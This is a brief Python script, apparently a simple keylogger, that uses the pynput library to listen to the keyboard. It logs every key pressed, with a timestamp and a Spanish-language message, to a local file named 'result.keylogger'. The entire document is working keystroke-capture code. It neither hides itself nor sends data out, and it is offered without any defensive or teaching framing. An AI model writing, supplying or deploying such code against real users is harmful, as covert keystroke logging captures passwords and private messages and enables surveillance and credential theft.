from pynput.keyboard import Listener
import logging

logging.basicConfig(filename='result.keylogger', level=logging.DEBUG, format="%(asctime)s: %(message)s")

def keystroke(key):
    logging.info("se ha pulsado la tecla: %s", key)

with Listener(on_press=keystroke) as input_keyboard:
    input_keyboard.join()
